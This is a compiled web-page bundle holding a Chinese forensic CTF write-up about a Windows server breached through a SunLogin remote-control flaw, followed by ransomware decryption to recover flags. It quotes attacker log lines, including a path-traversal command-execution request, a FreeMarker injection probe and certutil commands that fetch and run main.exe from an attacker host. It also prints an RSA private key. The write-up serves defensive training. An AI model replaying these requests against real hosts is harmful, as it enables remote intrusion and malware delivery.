"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[2836],{49973:(e,n,c)=>{c.r(n),c.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>h,frontMatter:()=>t,metadata:()=>r,toc:()=>d});var i=c(85893),s=c(11151);const t={},l="\u7b2c\u56db\u7ae0 windows \u5b9e\u6218 - \u5411\u65e5\u8475",r={id:"Xuanji/Unit-4/64",title:"\u7b2c\u56db\u7ae0 windows \u5b9e\u6218 - \u5411\u65e5\u8475",description:"1",source:"@site/docs/Xuanji/Unit-4/64.md",sourceDirName:"Xuanji/Unit-4",slug:"/Xuanji/Unit-4/64",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-4/64",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Unit-4/64.md",tags:[],version:"current",frontMatter:{},sidebar:"Xuanji_Sidebar",previous:{title:"\u7b2c\u56db\u7ae0 windows \u5b9e\u6218 - emlog",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-4/61"},next:{title:"\u7b2c\u56db\u7ae0 - windows \u65e5\u5fd7\u5206\u6790",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-4/89"}},o={},d=[{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2},{value:"5",id:"5",level:2}];function a(e){const n={admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,s.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"\u7b2c\u56db\u7ae0-windows-\u5b9e\u6218---\u5411\u65e5\u8475",children:"\u7b2c\u56db\u7ae0 windows \u5b9e\u6218 - \u5411\u65e5\u8475"})}),"\n",(0,i.jsx)(n.h2,{id:"1",children:"1"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u901a\u8fc7\u672c\u5730 PC RDP \u5230\u670d\u52a1\u5668\u5e76\u4e14\u627e\u5230\u9ed1\u5ba2\u9996\u6b21\u653b\u51fb\u6210\u529f\u7684\u65f6\u95f4\u4e3a \u4e3a\u591a\u5c11, \u5c06\u9ed1\u5ba2\u9996\u6b21\u653b\u51fb\u6210\u529f\u7684\u65f6\u95f4\u4e3a \u4f5c\u4e3a FLAG \u63d0\u4ea4 (2028-03-26 08:11:25.123)"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u4f7f\u7528 rdp \u767b\u5f55\u5230\u670d\u52a1\u5668\uff0c\u5b9a\u4f4d\u5230\u5411\u65e5\u8475\u7684\u65e5\u5fd7\u76ee\u5f55"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\log\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:c(58956).Z+"",width:"2010",height:"1151"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c06\u65e5\u5fd7\u6587\u4ef6\u63d0\u53d6\u51fa\u6765\u8fdb\u884c\u5206\u6790\uff0c\u5728\u5176\u4e2d\u627e\u5230\u4ee5\u4e0b\u8bb0\u5f55"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-log",metastring:'title="sunlogin_service.20240321-191046.log"',children:'2024-03-21 19:54:46.097 - Info  - [service][TcpAcceptor] new acceptor 192.168.31.45:63976--\x3e192.168.31.114:49724\n2024-03-21 19:54:53.054 - Info  - [service][TcpAcceptor] new acceptor 192.168.31.45:57945--\x3e192.168.31.114:49724\n2024-03-21 19:54:56.066 - Info  - [service][TcpAcceptor] new acceptor 192.168.31.45:58485--\x3e192.168.31.114:49724\n2024-03-21 19:54:56.066 - Info  - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:58485, path: /, version: HTTP/1.1\n2024-03-21 19:54:56.066 - Info  - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:58485,/, plugin:, session:\n2024-03-21 19:54:56.086 - Info  - [service][TcpAcceptor] new acceptor 192.168.31.45:58494--\x3e192.168.31.114:49724\n2024-03-21 19:54:56.086 - Info  - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:58494, path: /jbossmq-httpil/HTTPServerILServlet, version: HTTP/1.1\n2024-03-21 19:54:56.086 - Info  - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:58494,/jbossmq-httpil/HTTPServerILServlet, plugin:jbossmq-httpil, session:\n2024-03-21 19:54:56.086 - Info  - [service][TcpAcceptor] new acceptor 192.168.31.45:58495--\x3e192.168.31.114:49724\n2024-03-21 19:54:56.086 - Info  - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:58495, path: /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b"freemarker%2etemplate%2eutility%2eExecute"%3fnew%28%29%28"id"%29%7d, version: HTTP/1.1\n2024-03-21 19:54:56.086 - Info  - [Acceptor][HTTP] new RC HTTP connection 192.168.31.45:58495,/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b"freemarker%2etemplate%2eutility%2eExecute"%3fnew%28%29%28"id"%29%7d, plugin:catalog-portal, session:\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5f88\u660e\u663e\u7684\u76ee\u5f55\u626b\u63cf\u7684\u884c\u4e3a"}),"\n",(0,i.jsx)(n.p,{children:"\u5e76\u5728\u540e\u7eed\u65e5\u5fd7\u4e2d\u627e\u5230\u4ee5\u4e0b Path"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-log",children:"/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami\n/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+pwd\n/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+certutil+-urlcache+-split+-f+http%3A%2F%2F192.168.31.249%2Fmain.exe\n/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+certutil+-urlcache+-split+-f+http%3A%2F%2F192.168.31.249%2Fmypublic.pem\n/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+echo+647224830+%3E+qq.txt\n/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+.%2Fmain.exe\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u89e3\u7801\u5904\u7406\u5f97\u5230"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-log",children:"/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe whoami\n/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe pwd\n/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe certutil -urlcache -split -f http://192.168.31.249/main.exe\n/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe certutil -urlcache -split -f http://192.168.31.249/mypublic.pem\n/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe echo 647224830 > qq.txt\n/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe ./main.exe\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5f88\u660e\u663e\u7684\u5411\u65e5\u8475 RCE \u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u7b2c\u4e00\u6b21\u6267\u884c ",(0,i.jsx)(n.code,{children:"whoami"})," \u7684\u65f6\u95f4\u5c31\u662f\u7b54\u6848"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-flag",children:"flag{2024-03-26 10:16:25.585}\n"})}),"\n",(0,i.jsx)(n.h2,{id:"2",children:"2"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u901a\u8fc7\u672c\u5730 PC RDP \u5230\u670d\u52a1\u5668\u5e76\u4e14\u627e\u5230\u9ed1\u5ba2\u653b\u51fb\u7684 IP \u4e3a\u591a\u5c11, \u5c06\u9ed1\u5ba2\u653b\u51fb IP \u4f5c\u4e3a FLAG \u63d0\u4ea4"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u4e0a\u4e00\u9898\u4e2d\uff0c\u5411\u65e5\u8475\u7684\u8fde\u63a5\u65e5\u5fd7\u4e2d\u5c31\u6709"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-flag",children:"flag{192.168.31.45}\n"})}),"\n",(0,i.jsx)(n.h2,{id:"3",children:"3"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u901a\u8fc7\u672c\u5730 PC RDP \u5230\u670d\u52a1\u5668\u5e76\u4e14\u627e\u5230\u9ed1\u5ba2\u6258\u7ba1\u6076\u610f\u7a0b\u5e8f IP \u4e3a, \u5c06\u9ed1\u5ba2\u6258\u7ba1\u6076\u610f\u7a0b\u5e8f IP \u4f5c\u4e3a FLAG \u63d0\u4ea4"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u5728\u7b2c\u4e00\u9898\u4e2d\uff0c\u5206\u6790\u7684\u653b\u51fb\u8005\u6267\u884c\u7684\u547d\u4ee4"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"whoami\npwd\ncertutil -urlcache -split -f http://192.168.31.249/main.exe\ncertutil -urlcache -split -f http://192.168.31.249/mypublic.pem\necho 647224830 > qq.txt\n./main.exe\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-flag",children:"flag{192.168.31.249}\n"})}),"\n",(0,i.jsx)(n.h2,{id:"4",children:"4"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u627e\u5230\u9ed1\u5ba2\u89e3\u5bc6 DEC \u6587\u4ef6, \u5c06\u9ed1\u5ba2 DEC \u6587\u4ef6\u7684 md5 \u4f5c\u4e3a FLAG \u63d0\u4ea4"}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["\u4e0a\u4f20 ",(0,i.jsx)(n.code,{children:"everything.exe"})," \u6267\u884c\u6587\u4ef6\u641c\u7d22\uff0c\u5f97\u5230\u4ee5\u4e0b\u7ed3\u679c"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"C:\\Windows\\System32\\qq.txt\nC:\\Windows\\System32\\mypublic.pem\nC:\\Windows\\System32\\main.exe\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c06\u4e09\u4e2a\u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u5206\u6790\uff0c\u4f46\u662f\u6ca1\u6709\u6709\u4ef7\u503c\u4fe1\u606f"}),"\n",(0,i.jsx)(n.admonition,{type:"warning",children:(0,i.jsx)(n.p,{children:"\u8fd9\u4e00\u9898\u6709\u4e00\u70b9\u8111\u6d1e"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5728 ",(0,i.jsx)(n.code,{children:"qq.txt"})," \u4e2d\uff0c\u5f97\u5230\u8fd9\u4e2a\u6570\u5b57 ",(0,i.jsx)(n.code,{children:"647224830"})]}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u4e2a\u53f7\u7801\u6307\u5411\u7384\u673a\u7684 QQ \u7fa4\uff0c\u5728\u7fa4\u6587\u4ef6\u4e2d\u627e\u5230"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:c(90297).Z+"",width:"1325",height:"905"})}),"\n",(0,i.jsx)(n.p,{children:"\u4e0b\u8f7d\u4e0b\u6765\u8ba1\u7b97\u6587\u4ef6\u54c8\u5e0c\u5373\u53ef"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-flag",children:"flag{5ad8d202f80202f6d31e077fc9b0fc6b}\n"})}),"\n",(0,i.jsx)(n.h2,{id:"5",children:"5"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u901a\u8fc7\u672c\u5730 PC RDP \u5230\u670d\u52a1\u5668\u5e76\u4e14\u89e3\u5bc6\u9ed1\u5ba2\u52d2\u7d22\u8f6f\u4ef6, \u5c06\u684c\u9762\u52a0\u5bc6\u6587\u4ef6\u4e2d\u5173\u952e\u4fe1\u606f\u4f5c\u4e3a FLAG \u63d0\u4ea4"}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5c06\u684c\u9762\u4e0a\u7684 ",(0,i.jsx)(n.code,{children:"baoleiji.txt.banana"})," \u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=\n\nYour files have been encrypted\n\n0sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4=\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u6267\u884cRSA\u89e3\u5bc6"}),"\n",(0,i.jsxs)(n.admonition,{type:"warning",children:[(0,i.jsx)(n.p,{children:"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cpem\u6587\u4ef6\u5185\u7684\u8bc1\u4e66\u7ed3\u6784\u5934\u6709\u95ee\u9898\uff0c\u9700\u8981\u6539\u4e3a\u4ee5\u4e0b\u5f62\u5f0f"}),(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQDWQqpkHRKtRu66MjTrNZC13A6rIlGaJBd/FYBy4ifiITasCnQE\nJ9aRTIYQsM5iincecnvY8xGYMg5pVTp6P4fxS4/+1bAEciRXSTCmLI8FeDd3sjOc\nHTw82sG0hfnnb0b/LFhbOCk7BgLnpwvSy5za/dtVQFSDbQbQuTBp029AKwIDAQAB\nAoGBAKh6952NtvgGhQZpIG+sSUSX6/jqHZzFsKw/7idoatBIKcOS3LO/19udfvZ0\n8XVPSGfqwjRQvo8dHXP6juc+Odg1XOLPw4fjjJz9b9dLKCKwtIU3CwA1AmuhYNGp\n1OXlHLyUaNVTN3TZN9Dn7txD4gOvLIirqbmhzy/N7PdPF5ThAkEA4MB++5DSY7Kv\nMO1uHuxTr/jRy6754Mzgo0fpLBXSB13/nLMxRA6QEbigoAFpsFd36EYMKzftbezB\ngx2nphvLUwJBAPQMv730MqCWjaCPLgYRV+oMU6OnOMs6+ALql+I1eVqVfBAt+5De\nHMxY7mWdaR9pofzuz+6KkmwRHqKSVw45dMkCQFJ68l76B+vkoFxxVe9tRU0YIE4C\nmdtA9NOXSWAPZfOkMHFeZZ8XRRHr0q7FtfasMuoAAuk9bhngQCgREvxnyNcCQGnt\ntrQecHMfpe2Q+CsOEBi4rP0VsiMUP14UsUQwbbIRvD3Rl6WzotBXsXJNtrk5wmPk\nzD//ybo6XA+4cSztZ3ECQQC92ck1XJm7V12SOFqHcNXFoS8tFvgNQXNEahmhJ2wb\nxTo0VwUhCeG1n8X5PqRn6Rcsh8YQAt924YrWtcTxrg8g\n-----END RSA PRIVATE KEY-----\n"})})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:c(6536).Z+"",width:"2559",height:"1371"})}),"\n",(0,i.jsx)(n.p,{children:"\u7ee7\u7eed\u4e0b\u4e00\u6b65\u89e3\u5bc6"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:c(74028).Z+"",width:"2559",height:"1371"})}),"\n",(0,i.jsx)(n.p,{children:"\u7f16\u7801\u5b58\u5728\u6709\u4e00\u5b9a\u95ee\u9898\uff0c\u6362\u4e00\u4e2a\u5728\u7ebf\u5de5\u5177\u5c31\u884c"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:c(35074).Z+"",width:"2559",height:"1371"})}),"\n",(0,i.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-flag",children:"flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(a,{...e})}):a(e)}},58956:(e,n,c)=>{c.d(n,{Z:()=>i});const i=c.p+"assets/images/image_20241000-230046-ce3fe3dde0228bccb79d867d65038bc6.png"},90297:(e,n,c)=>{c.d(n,{Z:()=>i});const i=c.p+"assets/images/image_20241030-233019-ea974ab5ca32782d03f215e49d6ffcb4.png"},6536:(e,n,c)=>{c.d(n,{Z:()=>i});const i=c.p+"assets/images/image_20241038-233807-8def25d56baebe3d9c880e81cfab2927.png"},74028:(e,n,c)=>{c.d(n,{Z:()=>i});const i=c.p+"assets/images/image_20241043-234344-e3a79c9fdc04d3cef62f25ca16989bec.png"},35074:(e,n,c)=>{c.d(n,{Z:()=>i});const i=c.p+"assets/images/image_20241049-234958-0f2df5087bcfbdc909fbdb6ed024c7cb.png"},11151:(e,n,c)=>{c.d(n,{Z:()=>r,a:()=>l});var i=c(67294);const s={},t=i.createContext(s);function l(e){const n=i.useContext(t);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:l(e.components),i.createElement(t.Provider,{value:n},e.children)}}}]);